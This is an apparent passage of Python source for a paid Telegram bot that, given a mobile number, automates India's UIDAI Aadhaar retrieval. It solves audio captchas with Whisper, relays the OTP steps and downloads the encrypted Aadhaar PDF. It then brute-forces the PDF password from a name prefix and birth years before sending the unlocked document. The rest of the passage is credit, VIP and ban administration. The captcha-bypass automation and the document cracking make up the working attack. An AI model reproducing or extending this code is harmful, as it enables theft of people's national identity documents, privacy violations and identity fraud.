            f"<b>Success:</b> <code>{user_data.get('successful_searches', 0)}</code>\n"
            f"<b>Unlimited:</b> {unlim_str}\n"
            f"<b>Daily Limit:</b> {dl_str}\n"
            f"<b>Banned:</b> {ban_status}\n"
            f"━━━━━━━━━━━━━━━━━━"
        )

        markup = types.InlineKeyboardMarkup(row_width=2)
        if req_id == OWNER_ID or (is_admin(req_id) and user_data.get("role") != "owner"):
            markup.add(
                types.InlineKeyboardButton("💰 Add Cr", callback_data=f"adm_gv_{target_id}"),
                types.InlineKeyboardButton("📉 Del Cr", callback_data=f"adm_rv_{target_id}")
            )
            markup.add(
                types.InlineKeyboardButton("⏳ Add VIP", callback_data=f"adm_au_{target_id}"),
                types.InlineKeyboardButton("❌ Rev VIP", callback_data=f"adm_ru_{target_id}")
            )
            markup.add(
                types.InlineKeyboardButton("📅 Daily Limit", callback_data=f"adm_dl_{target_id}"),
                types.InlineKeyboardButton("🚫 Ban User" if not user_data.get('banned') else "✅ Unban User", callback_data=f"adm_bn_{target_id}")
            )

        await bot.send_message(msg.chat.id, info_text, parse_mode='HTML', reply_markup=markup)
    except Exception as e: 
        await safe_reply(msg, f"Error: {e}")

@bot.callback_query_handler(func=lambda c: c.data.startswith("adm_"))
async def info_admin_cb(call):
    uid = call.from_user.id
    if not is_admin(uid): return
    parts = call.data.split("_")
    action = parts[1]
    target = int(parts[2])
    init_user(target)
    
    if action == "gv":
        users_db[uid]["state"] = "WAIT_ADMIN_ADD_CR"
        users_db[uid]["temp"]["admin_target"] = target
        await bot.answer_callback_query(call.id)
        await bot.send_message(call.message.chat.id, f"🔢 <b>How many credits do you want to add to user <code>{target}</code>?</b>\n<i>Reply with a number.</i>", parse_mode='HTML')
        return
        
    elif action == "rv":
        users_db[target]['credits'] = max(0, users_db[target]['credits'] - 5)
        save_db()
        save_log(call.from_user.first_name, uid, "REMOVED 5 CR", str(target), target)
        await bot.answer_callback_query(call.id, "✅ Removed 5 Credits!", show_alert=True)
        
    elif action == "au":
        users_db[uid]["state"] = "WAIT_ADMIN_ADD_VIP"
        users_db[uid]["temp"]["admin_target"] = target
        await bot.answer_callback_query(call.id)
        await bot.send_message(call.message.chat.id, f"⏳ <b>How many days of VIP access do you want to add for user <code>{target}</code>?</b>\n<i>Reply with a number.</i>", parse_mode='HTML')
        return
        
    elif action == "ru":
        users_db[target]['unlimited_until'] = 0
        save_db()
        save_log(call.from_user.first_name, uid, "REVOKED UNLIMITED", str(target), target)
        await bot.answer_callback_query(call.id, "❌ Unlimited Tier Revoked.", show_alert=True)
        
    elif action == "dl":
        current_limit = users_db[target].get('daily_limit', 0)
        next_limit = 10 if current_limit == 0 else (50 if current_limit == 10 else (100 if current_limit == 50 else 0))
        users_db[target]['daily_limit'] = next_limit
        save_db()
        save_log(call.from_user.first_name, uid, f"SET DAILY LIMIT TO {next_limit}", str(target), target)
        await bot.answer_callback_query(call.id, f"📅 Daily Limit adjusted to: {next_limit if next_limit > 0 else 'No Limit'}", show_alert=True)
        
    elif action == "bn":
        users_db[target]['banned'] = not users_db[target]['banned']
        save_db()
        status = "BANNED" if users_db[target]['banned'] else "UNBANNED"
        save_log(call.from_user.first_name, uid, status, str(target), target)
        await bot.answer_callback_query(call.id, f"✅ User operational status: {status}!", show_alert=True)

    try:
        chat = await bot.get_chat(target)
        target_name = chat.first_name or "Unknown"
        target_user = f"@{chat.username}" if chat.username else "None"
        unlim_ts = users_db[target].get('unlimited_until', 0)
        unlim_str = "Yes ✅" if unlim_ts > time.time() else "No"
        dl_str = f"{users_db[target].get('daily_limit', 0)}" if users_db[target].get('daily_limit', 0) > 0 else "No Limit"
        ban_status = "Yes 🚫" if users_db[target].get('banned') else "No ✅"
        role_status = users_db[target].get("role", "user").upper()

        refreshed_text = (
            f"👤 <b>𝗨𝗦𝗘𝗥 𝗣𝗥𝗢𝗙𝗜𝗟𝗘 𝗜𝗡𝗙𝗢</b> 👤\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"<b>Name:</b> {target_name}\n"
            f"<b>User:</b> {target_user}\n"
            f"<b>ID:</b> <code>{target}</code>\n"
            f"<b>Role:</b> {role_status}\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"<b>Credits:</b> <code>{users_db[target]['credits']}</code>\n"
            f"<b>Success:</b> <code>{users_db[target].get('successful_searches', 0)}</code>\n"
            f"<b>Unlimited:</b> {unlim_str}\n"
            f"<b>Daily Limit:</b> {dl_str}\n"
            f"<b>Banned:</b> {ban_status}\n"
            f"━━━━━━━━━━━━━━━━━━"
        )
        
        updated_markup = types.InlineKeyboardMarkup(row_width=2)
        updated_markup.add(
            types.InlineKeyboardButton("💰 Add Cr", callback_data=f"adm_gv_{target}"),
            types.InlineKeyboardButton("📉 Del Cr", callback_data=f"adm_rv_{target}")
        )
        updated_markup.add(
            types.InlineKeyboardButton("⏳ Add VIP", callback_data=f"adm_au_{target}"),
            types.InlineKeyboardButton("❌ Rev VIP", callback_data=f"adm_ru_{target}")
        )
        updated_markup.add(
            types.InlineKeyboardButton("📅 Daily Limit", callback_data=f"adm_dl_{target}"),
            types.InlineKeyboardButton("🚫 Ban User" if not users_db[target].get('banned') else "✅ Unban User", callback_data=f"adm_bn_{target}")
        )
        
        await bot.edit_message_text(refreshed_text, call.message.chat.id, call.message.message_id, reply_markup=updated_markup, parse_mode='HTML')
    except: pass

@bot.message_handler(func=lambda m: users_db.get(m.from_user.id, {}).get('state') in ["WAIT_ADMIN_ADD_CR", "WAIT_ADMIN_ADD_VIP"])
async def handle_admin_dynamic_input(message):
    uid = message.from_user.id
    state = users_db[uid]["state"]
    target = users_db[uid]["temp"].get("admin_target")
    
    users_db[uid]["state"] = None
    
    if not target or target not in users_db:
        return await safe_reply(message, "❌ <b>Error: Target user session expired. Try again via /info.</b>", parse_mode='HTML')
        
    try:
        amount = int(message.text.strip())
    except ValueError:
        return await safe_reply(message, "❌ <b>Invalid input. You must enter a valid number. Action cancelled.</b>", parse_mode='HTML')

    if state == "WAIT_ADMIN_ADD_CR":
        users_db[target]['credits'] += amount
        save_db()
        save_log(message.from_user.first_name, uid, f"ADDED {amount} CR", str(target), target)
        await safe_reply(message, f"✅ <b>Successfully added {amount} Credits to user <code>{target}</code>!</b>\n<i>Run /info {target} to see the changes.</i>", parse_mode='HTML')
        
    elif state == "WAIT_ADMIN_ADD_VIP":
        current_expiry = max(time.time(), users_db[target].get('unlimited_until', 0))
        users_db[target]['unlimited_until'] = current_expiry + (amount * 86400)
        save_db()
        save_log(message.from_user.first_name, uid, f"ADD UNLIMITED {amount}D", str(target), target)
        await safe_reply(message, f"✅ <b>Successfully added {amount} Days of VIP access to user <code>{target}</code>!</b>\n<i>Run /info {target} to see the changes.</i>", parse_mode='HTML')

@bot.message_handler(commands=['give', 'revoke', 'ban', 'unban'])
async def admin_basic_commands(message):
    if not is_admin(message.from_user.id): return
    cmd = message.text.split()[0].lower()
    if '@' in cmd: cmd = cmd.split('@')[0]

    parts = message.text.split()
    if len(parts) < 2:
        return await safe_reply(message, f"<code>[!] Format: {cmd} [USER_ID]</code>", parse_mode='HTML')

    try:
        t_id = int(parts[1])
        init_user(t_id)

        if cmd == '/ban':
            users_db[t_id]['banned'] = True
            save_db()
            save_log(message.from_user.first_name, message.from_user.id, "BANNED USER", str(t_id), t_id)
            await safe_reply(message, f"🚫 <b>User {t_id} has been BANNED.</b>", parse_mode='HTML')

        elif cmd == '/unban':
            users_db[t_id]['banned'] = False
            save_db()
            save_log(message.from_user.first_name, message.from_user.id, "UNBANNED USER", str(t_id), t_id)
            await safe_reply(message, f"✅ <b>User {t_id} has been UNBANNED.</b>", parse_mode='HTML')

        elif cmd == '/give' and len(parts) > 2:
            amt = int(parts[2])
            users_db[t_id]['credits'] += amt
            save_db()
            save_log(message.from_user.first_name, message.from_user.id, f"CREDIT GIVING (+{amt})", str(t_id), t_id)
            await safe_reply(message, f"✅ Added {amt} credits to {t_id}.")

        elif cmd == '/revoke' and len(parts) > 2:
            amt = int(parts[2])
            users_db[t_id]['credits'] = max(0, users_db[t_id]['credits'] - amt)
            save_db()
            save_log(message.from_user.first_name, message.from_user.id, f"CREDIT REMOVING (-{amt})", str(t_id), t_id)
            await safe_reply(message, f"✅ Revoked {amt} credits from {t_id}.")

    except ValueError:
        await safe_reply(message, "❌ Invalid ID or Amount. Must be a number.")

# ==============================================================================
# BROADCAST COMMAND
# ==============================================================================
@bot.message_handler(commands=['broadcast'])
async def broadcast_command(msg):
    uid = msg.from_user.id
    if users_db.get(uid, {}).get("role") != "owner": 
        return

    is_reply = bool(msg.reply_to_message)
    text_to_send = msg.text.replace("/broadcast", "", 1).strip()

    if not is_reply and not text_to_send:
        help_text = (
            "⚠️ <b>Usage:</b>\n"
            "Reply to ANY message (photo, video, file, or text) with <code>/broadcast</code>\n\n"
            "OR type:\n"
            "<code>/broadcast [your message]</code>"
        )
        return await safe_reply(msg, help_text, parse_mode='HTML')

    uids = list(users_db.keys())
    
    estimated_time = (len(uids) * 0.05) + 5
    
    status_msg = await safe_reply(
        msg, 
        f"⏳ <b>Broadcasting to {len(uids)} users...</b>\n"
        f"<i>Estimated time: ~{int(estimated_time)} seconds. Please leave the bot running.</i>", 
        parse_mode='HTML'
    )
    
    success = 0
    failed = 0

    for uid_str in uids:
        target_uid = int(uid_str)
        try:
            if is_reply:
                await bot.copy_message(chat_id=target_uid, from_chat_id=msg.chat.id, message_id=msg.reply_to_message.message_id)
            else:
                formatted_msg = f"📢 <b>𝗦𝗬𝗦𝗧𝗘𝗠 𝗕𝗥𝗢𝗔𝗗𝗖𝗔𝗦𝗧</b>\n━━━━━━━━━━━━━━━━━━\n{text_to_send}"
                await bot.send_message(target_uid, formatted_msg, parse_mode='HTML')
            
            success += 1
            await asyncio.sleep(0.05)
            
        except Exception as e:
            err_str = str(e)
            if "429" in err_str or "Too Many Requests" in err_str:
                await asyncio.sleep(5) 
            failed += 1

    final_status = (
        f"✅ <b>Broadcast Complete!</b>\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"🎯 Success: {success}\n"
        f"❌ Failed: {failed} (Blocked bot or deleted accounts)"
    )
    if status_msg:
        await safe_edit(final_status, msg.chat.id, status_msg.message_id)

# ==============================================================================
# /o2a COMMAND
# ==============================================================================
@bot.message_handler(commands=['o2a'])
async def start_extraction(message):
    if not await require_fsub(message): return
    
    uid = message.from_user.id
    init_user(uid)

    if users_db[uid]["banned"]:
        return await safe_reply(message, "🚫 <b>ACCESS DENIED. BANNED.</b>", parse_mode='HTML')

    today_str = datetime.now().strftime("%Y-%m-%d")
    if users_db[uid].get("last_active_date") != today_str:
        users_db[uid]["used_today"] = 0
        users_db[uid]["last_active_date"] = today_str
        save_db()

    dl = users_db[uid].get("daily_limit", 0)
    if dl > 0 and users_db[uid]["used_today"] >= dl and not is_admin(uid):
        return await safe_reply(message, f"❌ <b>DAILY LIMIT REACHED.</b> ({dl} per day)", parse_mode='HTML')

    if not is_admin(uid):
        unlim_ts = users_db[uid].get('unlimited_until', 0)
        if unlim_ts < time.time() and users_db[uid]['credits'] <= 0:
            return await safe_reply(message, "❌ <b>ZERO CREDITS.</b> Buy keys or wait for admin drops.", parse_mode='HTML')

    parts = message.text.split()
    if len(parts) < 2 or not parts[1].isdigit() or len(parts[1]) != 10:
        return await safe_reply(message, "<code>[!] Usage: /o2a 1234567890</code>", parse_mode='HTML')

    mobile = parts[1]

    users_db[uid]["state"] = "PROCESSING"
    users_db[uid]["temp"] = {
        "mobile": mobile,
        "target_name": "Mr",                  
        "session": requests.Session(),
        "req_id": str(uuid.uuid4()),
        "credit_deducted": False,
        "used_today_incremented": False
    }
    temp = users_db[uid]["temp"]

    if EXTRACTION_LIMIT.locked():
        msg = await bot.send_message(message.chat.id, get_clean_ui(mobile, "⏳ Waiting in queue..."), parse_mode='HTML')
    else:
        msg = await bot.send_message(message.chat.id, get_clean_ui(mobile, "⚙️ Initialising Connection..."), parse_mode='HTML')
        
    temp["msg_id"] = msg.message_id

    async with EXTRACTION_LIMIT:
        await phase_1_captcha_with_retry(uid, message.chat.id)

# ==============================================================================
# PHASE 1 – CAPTCHA RETRY & ERROR HANDLING
# ==============================================================================
async def phase_1_captcha_with_retry(uid, chat_id):
    temp = users_db[uid]["temp"]
    mobile = temp.get("mobile")
    sess = temp.get("session")
    msg_id = temp.get("msg_id") 
    
    if not mobile or not sess: return
    headers = get_uidai_headers(temp["req_id"])

    max_retries = 5 
    for attempt in range(1, max_retries + 1):
        await safe_edit(get_clean_ui(mobile, f"🔍 Solving Captcha (Attempt {attempt}/{max_retries})..."), chat_id, msg_id)

        audio_b64, cap_txn_id = await asyncio.to_thread(fetch_captcha, sess, headers)
        if not audio_b64:
            if attempt < max_retries: continue
            await safe_edit(get_clean_ui(mobile, "❌ Captcha fetch failed after max retries."), chat_id, msg_id)
            users_db[uid]["state"] = None
            return

        # NEW: Lock Whisper to prevent PyTorch thread collisions and OOM (Segfault)
        async with WHISPER_LOCK:
            cap_text = await asyncio.to_thread(process_audio_sync, audio_b64)
            
        if "error" in cap_text.lower() or len(cap_text) < 4:
            if attempt < max_retries: continue
            await safe_edit(get_clean_ui(mobile, "❌ Captcha solving error."), chat_id, msg_id)
            users_db[uid]["state"] = None
            return

        await safe_edit(get_clean_ui(mobile, "📡 Requesting Verification OTP..."), chat_id, msg_id)

        otp_resp = await asyncio.to_thread(request_eid_otp, sess, mobile, "Mr", cap_text, cap_txn_id, headers)

        if isinstance(otp_resp, dict):
            res_data = otp_resp.get("responseData", {})
            if isinstance(res_data, dict) and str(res_data.get("status")).lower() == "failure":
                err_msg = res_data.get("message", "No Records Found")
                await safe_edit(get_clean_ui(mobile, f"❌ Failed: {err_msg}"), chat_id, msg_id)
                users_db[uid]["state"] = None
                return

            if str(otp_resp.get("status")).lower() == "success":
                otp_txn = res_data.get("otpTxnId") or otp_resp.get("otpTxnId")
                if not otp_txn:
                    if attempt < max_retries: continue
                    await safe_edit(get_clean_ui(mobile, "❌ API Error: Missing OTP Txn ID"), chat_id, msg_id)
                    users_db[uid]["state"] = None
                    return

                temp["p1_otp_txn"] = otp_txn
                temp["p1_cap_text"] = cap_text       
                temp["p1_cap_txn"] = cap_txn_id      
                users_db[uid]["state"] = "WAIT_PHASE1_OTP"
                
                prompt = "✉️ <b>Check SMS</b>\n🔢 <b>Enter the 6-digit Verification OTP:</b>"
                await safe_edit(get_clean_ui(mobile, "✅ OTP Sent Successfully!", prompt), chat_id, msg_id)
                return

        err_code = otp_resp.get("errorCode", "") if isinstance(otp_resp, dict) else ""
        err_str = str(otp_resp).lower()
        
        if err_code == "REU_VAL_CAP_INF_007" or "cap" in err_code.lower() or "invalid captcha" in err_str:
            await safe_edit(get_clean_ui(mobile, f"⚠️ Invalid Captcha, Retrying..."), chat_id, msg_id)
            continue

        if attempt < max_retries:
            continue

        err = err_code if err_code else "Unknown API Error"
        await safe_edit(get_clean_ui(mobile, f"❌ Failed: {err}"), chat_id, msg_id)
        await send_debug_log(mobile, "Phase1 OTP Request", err, otp_resp)
        users_db[uid]["state"] = None
        return

    users_db[uid]["state"] = None

# ==============================================================================
# PHASE 1 OTP VERIFICATION
# ==============================================================================
@bot.message_handler(func=lambda m: users_db.get(m.from_user.id, {}).get('state') == "WAIT_PHASE1_OTP")
async def handle_phase1_otp(message):
    uid = message.from_user.id
    otp = re.sub(r'\D', '', message.text)

    temp = users_db[uid].get("temp", {})
    if not temp: return
    
    users_db[uid]["state"] = "PROCESSING"
    mobile = temp.get("mobile")
    sess = temp.get("session")
    msg_id = temp.get("msg_id")
    
    if not mobile or not sess: return
    headers = get_uidai_headers(temp["req_id"])

    await safe_edit(get_clean_ui(mobile, "🔐 Verifying OTP securely..."), message.chat.id, msg_id)

    resp = await asyncio.to_thread(
        submit_eid_otp, sess, mobile, "Mr",
        temp["p1_cap_text"], temp["p1_cap_txn"],
        temp["p1_otp_txn"], otp,
        headers
    )

    if isinstance(resp, dict) and str(resp.get("status")).lower() == "success":
        response_data = resp.get("responseData", {})
        eid = response_data.get("eidNumber")
        extracted_name = response_data.get("name")

        if not eid:
            await safe_edit(get_clean_ui(mobile, "❌ Retrieval failed. Missing identifier."), message.chat.id, msg_id)
            users_db[uid]["state"] = None
            return

        temp["eid"] = eid
        temp["extracted_name"] = extracted_name  

        await safe_edit(get_clean_ui(mobile, "✅ Target Locked!"), message.chat.id, msg_id)
        
        phase1_ui = (
            f"🎉 <b>𝗣𝗛𝗔𝗦𝗘 𝟭 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘!</b> 🎉\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"👤 <b>Name:</b> <code>{extracted_name or 'Unknown'}</code>\n"
            f"🔖 <b>EID:</b> <code>[REDACTED]</code>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"<i>⏳ Initializing Phase 2...</i>"
        )
        await bot.send_message(message.chat.id, phase1_ui, parse_mode='HTML')
        
        msg2 = await bot.send_message(message.chat.id, get_clean_ui(mobile, "⚙️ Initialising Phase 2 Connection..."), parse_mode='HTML')
        temp["msg_id"] = msg2.message_id
        
        await phase_2_captcha_with_retry(uid, message.chat.id)
    else:
        err = resp.get("errorCode", "Invalid OTP") if isinstance(resp, dict) else "No response"
        await safe_edit(get_clean_ui(mobile, f"❌ Verification failed: {err}"), message.chat.id, msg_id)
        users_db[uid]["state"] = None
        await send_debug_log(mobile, "Phase1 OTP Submit", err, resp)

# ==============================================================================
# PHASE 2 – DOWNLOAD OTP WITH RETRY & ERROR HANDLING
# ==============================================================================
async def phase_2_captcha_with_retry(uid, chat_id):
    temp = users_db[uid]["temp"]
    sess = temp.get("session")
    mobile = temp.get("mobile")
    msg_id = temp.get("msg_id")
    
    if not mobile or not sess: return
    headers = get_uidai_headers(temp["req_id"])

    max_retries = 5 
    for attempt in range(1, max_retries + 1):
        await safe_edit(get_clean_ui(mobile, f"🔍 Preparing Download (Attempt {attempt}/{max_retries})..."), chat_id, msg_id)

        audio_b64, cap_txn_id = await asyncio.to_thread(fetch_captcha, sess, headers)
        if not audio_b64:
            if attempt < max_retries: continue
            await safe_edit(get_clean_ui(mobile, "❌ Preparation failed."), chat_id, msg_id)
            users_db[uid]["state"] = None
            return

        # NEW: Lock Whisper for safety
        async with WHISPER_LOCK:
            cap_text = await asyncio.to_thread(process_audio_sync, audio_b64)
            
        if "error" in cap_text.lower() or len(cap_text) < 4:
            if attempt < max_retries: continue
            await safe_edit(get_clean_ui(mobile, "❌ Resolution error."), chat_id, msg_id)
            users_db[uid]["state"] = None
            return

        await safe_edit(get_clean_ui(mobile, "📡 Requesting Download Security Pin..."), chat_id, msg_id)

        dl_resp = await asyncio.to_thread(request_download_otp, sess, temp["eid"], cap_text, cap_txn_id, temp["req_id"], headers)

        if isinstance(dl_resp, dict) and str(dl_resp.get("status")).lower() == "success":
            temp["p2_dl_txn"] = dl_resp.get("txnId")
            users_db[uid]["state"] = "WAIT_PHASE2_OTP"
            
            prompt = "✉️ <b>Check SMS</b>\n🔢 <b>Enter the 6-digit Download OTP:</b>"
            await safe_edit(get_clean_ui(mobile, "✅ Download Pin Sent!", prompt), chat_id, msg_id)
            return

        err_code = dl_resp.get("errorCode", "") if isinstance(dl_resp, dict) else ""
        err_str = str(dl_resp).lower()
        
        if err_code == "REU_VAL_CAP_INF_007" or "cap" in err_code.lower() or "invalid captcha" in err_str:
            await safe_edit(get_clean_ui(mobile, f"⚠️ Invalid Captcha, Retrying..."), chat_id, msg_id)
            continue

        if attempt < max_retries:
            continue

        err = err_code if err_code else "Unknown API Error"
        await safe_edit(get_clean_ui(mobile, f"❌ Pin request failed: {err}"), chat_id, msg_id)
        await send_debug_log(mobile, "Phase2 OTP Request", err, dl_resp)
        users_db[uid]["state"] = None
        return

    users_db[uid]["state"] = None

# ==============================================================================
# PHASE 2 OTP & DOWNLOAD
# ==============================================================================
@bot.message_handler(func=lambda m: users_db.get(m.from_user.id, {}).get('state') == "WAIT_PHASE2_OTP")
async def handle_phase2_otp(message):
    uid = message.from_user.id
    otp = re.sub(r'\D', '', message.text)

    temp = users_db[uid].get("temp", {})
    if not temp: return
    
    users_db[uid]["state"] = "PROCESSING"
    sess = temp.get("session")
    mobile = temp.get("mobile")
    msg_id = temp.get("msg_id") 
    
    if not mobile or not sess: return
    
    await safe_edit(get_clean_ui(mobile, "📥 Downloading Encrypted File..."), message.chat.id, msg_id)

    async with EXTRACTION_LIMIT:
        dl_data = await asyncio.to_thread(
            download_aadhaar,
            sess, temp["eid"], otp, temp["p2_dl_txn"],
            get_uidai_headers(temp["req_id"])
        )

    base64_pdf = dl_data.get("data", {}).get("aadhaarPdf") if isinstance(dl_data, dict) else None
    
    if not base64_pdf:
        await safe_edit(get_clean_ui(mobile, "❌ Download failed. Check PIN or try again."), message.chat.id, msg_id)
        users_db[uid]["state"] = None
        await send_debug_log(mobile, "Phase2 Download", "PDF missing", dl_data)
        refund_credit(uid)
        return

    enc_path = os.path.join(TEMP_DIR, f"enc_{temp['req_id']}.pdf")
    with open(enc_path, "wb") as f:
        f.write(base64.b64decode(base64_pdf))

    extracted_name = temp.get("extracted_name") or "Mr"
    name_clean = re.sub(r'[^a-zA-Z]', '', extracted_name).upper()
    password_prefix = name_clean[:4] if len(name_clean) >= 4 else name_clean.ljust(4, 'A')

    await safe_edit(get_clean_ui(mobile, "🔓 Bypassing Encryption..."), message.chat.id, msg_id)

    pwd = await asyncio.to_thread(brute_force_pdf, enc_path, password_prefix, 1930, 2030)
    if not pwd:
        if password_prefix != "MR":
            pwd = await asyncio.to_thread(brute_force_pdf, enc_path, "MR", 1930, 2030)

    if not pwd:
        await safe_edit(get_clean_ui(mobile, "❌ Failed to bypass security lock."), message.chat.id, msg_id)
        users_db[uid]["state"] = None
        if os.path.exists(enc_path): os.remove(enc_path)
        refund_credit(uid)
        return

    unlocked_path = os.path.join(TEMP_DIR, f"unlocked_{temp['req_id']}.pdf")
    success = await asyncio.to_thread(save_unlocked_pdf, enc_path, unlocked_path, pwd)

    if success:
        if not is_admin(uid):
            unlim_ts = users_db[uid].get('unlimited_until', 0)
            if unlim_ts < time.time():
                users_db[uid]["credits"] = max(0, users_db[uid]["credits"] - 1)
                users_db[uid]["temp"]["credit_deducted"] = True
            users_db[uid]["used_today"] += 1
            users_db[uid]["temp"]["used_today_incremented"] = True
        users_db[uid]["successful_searches"] += 1
        save_db()

        await safe_edit(get_clean_ui(mobile, "📤 Delivering Final Document..."), message.chat.id, msg_id)
        
        success_ui = (
            f"🎉 <b>𝗦 𝗨 𝗖 𝗖 𝗘 𝗦 𝗦</b> 🎉\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"📄 <b>Document:</b> Retrieved PDF\n"
            f"👤 <b>Name:</b> <code>{extracted_name}</code>\n"
            f"🔓 <b>Status:</b> <code>[ UNLOCKED ]</code>\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"<i>🔐 Retrieved securely via API</i>"
        )
        
        try:
            with open(unlocked_path, "rb") as doc:
                await bot.send_document(
                    message.chat.id, 
                    doc,
                    caption=success_ui,
                    parse_mode='HTML'
                )
        except Exception as e:
            await bot.send_message(message.chat.id, f"Upload error: {e}")
    else:
        await safe_edit(get_clean_ui(mobile, "❌ Could not finalize document."), message.chat.id, msg_id)
        refund_credit(uid)

    for f in [enc_path, unlocked_path]:
        if os.path.exists(f):
            try: os.remove(f)
            except: pass

    users_db[uid]["state"] = None

# ==============================================================================
# MAIN ENGINE - RESTART LOOP TO PREVENT TIMEOUT CRASHES
# ==============================================================================
async def main():
    print("⛩️ Bot is running...")
    while True:
        try:
            await bot.polling(non_stop=True, request_timeout=90)
        except Exception as e:
            print(f"⚠️ Network Drop: {e}. Reconnecting...")
            await asyncio.sleep(5)

if __name__ == '__main__':
    asyncio.run(main())
